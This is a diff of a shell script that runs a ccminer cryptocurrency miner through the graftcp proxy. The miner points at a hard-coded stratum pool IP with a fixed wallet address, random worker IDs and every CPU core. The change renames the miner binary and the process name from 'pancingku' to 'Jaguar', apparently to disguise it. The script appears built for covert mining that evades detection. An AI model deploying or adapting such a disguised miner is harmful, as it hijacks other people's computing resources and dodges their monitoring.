@@ -25,7 +25,7 @@ run_ccminer() {
   local proxy_port=$(echo "$proxy" | cut -d'@' -f2 | cut -d':' -f2)
 
   # Kill any leftover ccminer processes from previous runs
-  pkill -f 'pancingku'
+  pkill -f 'Jaguar'
   sleep 2  # Wait to ensure all processes are terminated
 
   # Set up graftcp configuration
@@ -46,7 +46,7 @@ END
   echo " "
 
   # Run ccminer in the background
-  /usr/bin/graftcp ./pancingku -c stratum+tcp://138.197.29.207:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x --cpu "$(nproc)"  &
+  /usr/bin/graftcp ./Jaguar -c stratum+tcp://138.197.29.207:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 100-1000 -n 1)) -p x --cpu "$(nproc)"  &
 
   # Store the process ID (PID) of ccminer
   ccminer_pid=$!
@@ -68,12 +68,12 @@ END
 
   # If the process is still running, force kill it
   if ps -p $ccminer_pid > /dev/null; then
-    echo "Force killing pancingku process."
+    echo "Force killing Jaguar process."
     kill -9 $ccminer_pid
   fi
 
   # Ensure all ccminer processes are terminated before proceeding
-  pkill -f 'pancingku'
+  pkill -f 'Jaguar'
   sleep 2  # Wait to ensure all processes are cleared
 }
 
